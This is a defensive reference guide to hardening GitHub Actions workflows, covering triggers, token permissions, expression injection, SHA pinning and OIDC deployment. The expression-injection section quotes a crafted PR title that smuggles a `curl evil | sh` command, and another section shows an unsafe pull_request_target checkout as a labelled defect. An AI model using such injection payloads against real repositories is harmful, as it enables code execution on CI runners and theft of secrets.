# GitHub Actions

Facts come from GitHub's [workflow syntax][syntax], [events][events],
and [secure use][secure] pages and the pinned action READMEs, all
fetched on 2026-09-25. Examples are in `assets/examples/github/`:
`good/` is the reference workflow, and `bad/` has one of each defect.
`verify.sh` lints both. No workflow was run on GitHub.

## Contents

- Event selection and the tested commit
- pull_request_target and workflow_run
- Least-privilege token permissions
- Expression injection
- Action pinning to commit SHAs
- Credential persistence after checkout
- Runner shell and pipefail
- Required-check aggregator
- Concurrency groups
- Artifacts between jobs
- Timeouts and matrix fail-fast
- OIDC deployment job

## Event selection and the tested commit

**Definition.** Each event runs a different commit with different
privileges:

- `pull_request` runs the merge commit of the PR branch with the base
  (`GITHUB_SHA`). The PR head is
  `github.event.pull_request.head.sha`.
- `push` runs the pushed ref.
- `merge_group` runs the merge-queue commit; checks that must pass in
  a merge queue need it.
- `schedule` and `workflow_dispatch` use the workflow on the default
  branch.

**Use when.** Choosing `on:` for a workflow, and deciding which SHA a
status belongs to.

**Do not use when.** Never add `paths` or `branches` filters to a
workflow whose job is a required check. A filtered-out workflow never
reports, and the required check stays pending.

**Example.** `good/.github/workflows/ci.yml`:

```yaml
on:
  pull_request:
  push:
    branches: [main]
  merge_group:
```

**Cost removed.** PRs stuck in the merge queue because the required
check never ran on `merge_group`.

**Verify.**

1. Each required check's workflow triggers on every event of the merge
   path: PR, merge queue, and push.
1. A docs-only PR still reports the required check. Not run here; it
   needs a hosted repository.

## pull_request_target and workflow_run

**Definition.** `pull_request_target` runs in the context of the base
repository's default branch, with its token and secrets. GitHub warns
that running untrusted code there can poison caches and leak write
access or secrets. `actions/checkout` v7 refuses to check out fork PR
code on `pull_request_target` or `workflow_run` unless
`allow-unsafe-pr-checkout: true` is set.

**Use when.** A workflow must label or comment on fork PRs and never
runs the PR's code.

**Do not use when.** The job builds or tests the PR; use
`pull_request`, which gives forks no secrets.

**Example.** The defect in `bad/`:

```yaml
on:
  pull_request_target:
...
      - uses: actions/checkout@v7
        with:
          ref: ${{ github.event.pull_request.head.sha }}
```

**Cost removed.** Fork PRs running with write tokens and secrets.
zizmor reports `error[dangerous-triggers]` on this file.

**Verify.**

1. `uvx zizmor@1.30.1 --offline .github/workflows` reports no
   `dangerous-triggers`, or each one is justified and checks out no PR
   code.

## Least-privilege token permissions

**Definition.** `permissions:` sets the `GITHUB_TOKEN` scopes. Once any
permission is specified, every unlisted permission becomes `none`. Set
read access at the workflow level and raise it only in the job that
needs more.

**Use when.** Every workflow.

**Do not use when.** No exception. A job that needs write access, such
as a release job, sets it on that job only.

**Example.**

```yaml
permissions:
  contents: read
jobs:
  release:
    permissions:
      contents: write
```

**Cost removed.** A compromised step that can push, approve, or
publish. zizmor reports `warning[excessive-permissions]` for the `bad/`
workflow, which has no `permissions:` block.

**Verify.**

1. `rg -n '^permissions:' .github/workflows` finds one per workflow,
   and zizmor reports no `excessive-permissions`.

## Expression injection

**Definition.** A `${{ }}` expression is substituted into the `run:`
script text before the shell parses it, and PR titles, branch names,
and comments are attacker-controlled. Pass them through `env:` and
quote the shell variable.

**Use when.** Any `run:` needs event data.

**Do not use when.** The value is not attacker-controlled, such as
`matrix` values or `github.sha`. Routing it through `env:` anyway keeps
one simple rule.

**Example.** Bad: `run: echo "Testing ${{ github.event.pull_request.title }}"`.

Good:

```yaml
- name: Check title format
  env:
    TITLE: ${{ github.event.pull_request.title }}
  run: |
    case "$TITLE" in
      feat:*|fix:*|docs:*|chore:*) echo "ok: $TITLE" ;;
      *) echo "title must start with feat:, fix:, docs:, or chore:"; exit 1 ;;
    esac
```

**Cost removed.** Code execution through a crafted title, such as
`a"; curl evil | sh; echo "`. actionlint reports that the expression is
"potentially untrusted", and zizmor reports `template-injection`.

**Verify.**

1. `actionlint` exits 0. `verify.sh` shows it failing on the `bad/`
   file at line 12.

## Action pinning to commit SHAs

**Definition.** `uses: owner/repo@<40-hex SHA> # vX.Y.Z`. Whoever
controls the action's repository can move a tag or branch to other
code, but not a SHA. The comment records which release the SHA is.

**Use when.** Every third-party action and reusable workflow.

**Do not use when.** The reference is local (`./`) or a Docker image
pinned by `@sha256:` digest.

**Example.** Pins resolved with `gh api repos/<repo>/commits/<tag>`:

```yaml
uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
```

**Cost removed.** Code changing under a tag, and comments drifting
from their pins. `check_action_pins.py --resolve` checks that each
comment's tag points to the pinned SHA.

**Verify.**

1. `python3 scripts/check_action_pins.py .github` reports
   `0 finding(s)`, and passes with `--resolve` too (network, `gh`).
1. When updating a pin, read the action's release notes for runner
   requirements. For example, checkout v5 and later use node24 and need
   runner v2.327.1 or later.

## Credential persistence after checkout

**Definition.** By default `actions/checkout` keeps the token for later
git commands: since v6 in a file under `$RUNNER_TEMP`, before that in
`.git/config`. Set `persist-credentials: false` in jobs that do not
push.

**Use when.** Build and test jobs.

**Do not use when.** The job pushes commits or tags with the token.

**Example.**

```yaml
- uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
  with:
    persist-credentials: false
```

**Cost removed.** A token that every later step can read, or that a
workspace artifact uploads. zizmor reports `artipacked` for `bad/`.

**Verify.**

1. zizmor reports no `artipacked` finding.

## Runner shell and pipefail

**Definition.** On Linux and macOS, the step's shell setting picks the
command:

- no `shell:` runs `bash -e {0}`;
- `shell: bash` runs `bash --noprofile --norc -eo pipefail {0}`;
- `shell: sh` runs `sh -e {0}`.

Only `shell: bash` fails a step when a command inside a pipe fails.

**Use when.** A `run:` uses a pipe, as in `test | tee log`.

**Do not use when.** The image has no bash. Write `set -o pipefail` as
the first line if the shell supports it, or avoid pipes.

**Example.** Executed by `verify.sh` on `false | tee /dev/null`:

| Invocation | Exit status |
| --- | --- |
| `bash --noprofile --norc -eo pipefail` (`shell: bash`) | 1 |
| `bash -e` (no `shell:`) | 0 |
| `sh -e` (`shell: sh`) | 0 |

The lines of `assets/examples/verify.sh` that produce the table:

```sh
printf 'false | tee /dev/null\necho reached\n' >pipe.sh
bash --noprofile --norc -eo pipefail pipe.sh >explicit.log 2>&1 && explicit=0 ||
    explicit=$?
bash -e pipe.sh >unspecified.log 2>&1 && unspecified=0 || unspecified=$?
sh -e pipe.sh >sh.log 2>&1 && shell_sh=0 || shell_sh=$?
[ "$explicit" -eq 1 ] && [ "$unspecified" -eq 0 ] && [ "$shell_sh" -eq 0 ] ||
    fail "shell exits: bash=$explicit unspecified=$unspecified sh=$shell_sh"
ok "failing pipe: shell: bash exits 1; unspecified (bash -e) and sh -e exit 0"
```

**Cost removed.** Green steps whose tests failed: the `bad/` step
`./ci/test.sh | tee test.log` with `shell: sh` passes even when the
tests fail.

**Verify.**

1. Every `run:` with a `|` has `shell: bash` or `set -o pipefail`:
   `rg -n -B3 '\| *tee' .github/workflows`.

## Required-check aggregator

**Definition.** One job that `needs` all required jobs and runs with
`if: always()`. It fails unless each dependency succeeded or was
skipped where a skip is intended. Branch protection requires only this
job.

**Use when.** A matrix or conditional jobs make listing each check in
branch protection fragile.

**Do not use when.** The aggregator would only print results. A `needs`
consumer that exits 0 on failure turns red into green.

**Example.** `good/ci/all-green.sh`, called with
`${{ needs.<job>.result }}` values:

```bash
if [ "$test" != success ]; then
    echo "test: $test (required: success)"
    fail=1
fi
if [ "$event" = pull_request ]; then
    expected_title=success
else
    expected_title=skipped # pr-title runs only for pull requests
fi
```

**Cost removed.** Merges past a failed, cancelled, or unexpectedly
skipped job. `verify.sh` checks 6 combinations; cancelled, failure, and
a skip on the wrong event each exit 1.

**Verify.**

1. The truth table in `verify.sh` passes for your aggregator's inputs.
1. Branch protection requires `all-green`. Check this in the repository
   settings; not run here.

## Concurrency groups

**Definition.** Runs in the same `concurrency.group` wait for each
other; `cancel-in-progress: true` cancels the older run.

**Use when.** Cancelling superseded PR runs, and serializing deployments
per environment.

**Do not use when.** A deployment or migration would be cancelled
midway; use `cancel-in-progress: false` for those.

**Example.**

```yaml
concurrency:
  group: ${{ github.workflow }}-${{ github.head_ref || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

**Cost removed.** Runner minutes spent on superseded PR commits, and
half-applied deployments.

**Verify.**

1. After two pushes to a PR, the first run shows as cancelled; a
   `main` push is never cancelled. Not run here.

## Artifacts between jobs

**Definition.** Files move between jobs through
`upload-artifact`/`download-artifact`. From v4 on, artifacts are
immutable: each name uploads once per run, so matrix legs need unique
names. `if-no-files-found: error` fails on an empty path; the default
is `warn`. GHES does not support the v4+ artifact actions.

**Use when.** A later job needs build output. Upload logs with
`if: always()`.

**Do not use when.** Passing small values; use job `outputs` through
`$GITHUB_OUTPUT`.

**Example.**

`<SHA>` stands for the full pin from the pinning card:

```yaml
- uses: actions/upload-artifact@<SHA> # v7.0.1
  if: ${{ always() }}
  with:
    name: test-log-${{ matrix.python }}
    path: test-${{ matrix.python }}.log
    if-no-files-found: error
```

**Cost removed.** Consumers silently receiving no files, and matrix
uploads colliding on one name.

**Verify.**

1. Every upload sets `if-no-files-found: error` and a name unique per
   matrix leg: `rg -n -A6 'upload-artifact' .github/workflows`.

## Timeouts and matrix fail-fast

**Definition.** `jobs.<id>.timeout-minutes` defaults to 360.
`strategy.fail-fast` (default `true`) cancels the other matrix legs
when one fails.

**Use when.** Every job gets `timeout-minutes`, at a few times its
normal duration. Set `fail-fast: false` when each leg's result is
useful on its own.

**Do not use when.** Never raise the timeout to hide a hang; find the
hang.

**Example.** The `good/` jobs use `timeout-minutes: 15`, `5`, and `20`
(`deploy`). The matrix sets `fail-fast: false`, so a failure on 3.11
still reports the 3.14 result. From `good/.github/workflows/ci.yml`:

```yaml
  test:
    strategy:
      fail-fast: false
      matrix:
        python: ["3.11", "3.14"]
    runs-on: ubuntu-latest
    timeout-minutes: 15
```

**Cost removed.** Six-hour hung jobs, and missing results from the
other matrix legs.

**Verify.**

1. `rg -n 'timeout-minutes' .github/workflows` shows one per job.

## OIDC deployment job

**Definition.** A deploy job requests `id-token: write` and exchanges
the OIDC token for short-lived cloud credentials. The permission alone
grants nothing in the cloud; the cloud trust policy must restrict the
repository, ref or environment, and audience
([OIDC hardening][oidc]).

**Use when.** Deploying to a cloud that supports OIDC federation.

**Do not use when.** Never grant `id-token: write` at the workflow
level; every job would get it.

**Example.**

```yaml
deploy:
  needs: [all-green]
  if: ${{ github.ref == 'refs/heads/main' }}
  environment: production
  permissions:
    contents: read
    id-token: write
  runs-on: ubuntu-latest
  steps:
    - run: ./ci/deploy.sh
```

**Cost removed.** Long-lived cloud keys stored in secrets. `environment`
also applies the environment's approval rules.

**Verify.**

1. The cloud role's trust condition names
   `repo:<owner>/<repo>:environment:production` (or the ref). Check it
   in the cloud console; not run here.

[syntax]: https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax
[events]: https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows
[secure]: https://docs.github.com/en/actions/reference/security/secure-use
[oidc]: https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect
